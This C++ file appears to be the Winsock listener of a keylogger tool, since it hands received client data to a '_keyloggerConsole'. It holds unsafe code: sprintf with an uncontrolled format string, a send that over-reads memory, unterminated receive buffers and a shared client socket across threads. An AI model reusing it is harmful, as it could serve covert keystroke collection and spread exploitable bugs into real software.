#include "server.h"
#include "answerFromClient.h"


void doThreading(Server * server)
{
	server->threadingClient();
}

void doSending(Server * server)
{
	server->sender("hi");
}

int Server::listener()
{
	WSADATA wsaData;
	int iResult;
	sockaddr_in addr; 

	addr.sin_family = AF_INET;
	addr.sin_port = htons(_port);
	addr.sin_addr.S_un.S_addr = inet_addr(_ip);

	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);//2.2 

	if (iResult)
	{
		std::cout << "ERROR! WSA startup failed";
		Sleep(1000);
		return -1;
	}

	_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (_sock == INVALID_SOCKET)
	{
		std::cout << "ERROR! Invalid socket\n";
		Sleep(1000);
		return -1;
	}

	iResult = bind(_sock, (sockaddr*)&addr, sizeof(sockaddr_in)); //TUTAJ BLAD

	if (iResult)
	{
		std::cout << "ERROR! bind failed %u" << GetLastError();
		Sleep(5000);
		return -1;
	}

	iResult = listen(_sock, SOMAXCONN);

	if (iResult)
	{
		std::cout << "ERROR! iResult failed %u" << GetLastError();
		Sleep(1000);
		return -1;
	}
	std::cout << "Listening...\n";

	while (client = accept(_sock, 0, 0)) /*accepting and "threading" clients*/
	{
		if (client == INVALID_SOCKET)
		{
			std::cout << "ERROR! invalid client socket" << GetLastError();
			continue;
		}
		std::thread t_threader(doThreading, this);
		t_threader.detach();
	}
	return 0;
}


int Server::threadingClient()
{
	std::cout << "Client connected!\n";
	

	char chunk[1024];
	while (recv(client, chunk, sizeof(chunk), 0))
	{
		gotConnection = true;
		std::string str(chunk);
		AnswerFromClient answer(str, _keyloggerConsole);
	}
	return 0;
}

void Server::sender(const std::string &str) const
{
	char ptr[1024];

		const char * c = str.c_str();
		sprintf(ptr, c);
		send(client, c, sizeof(ptr), 0);

}

void Server::lostConnection()
{
	gotConnection = false;
}
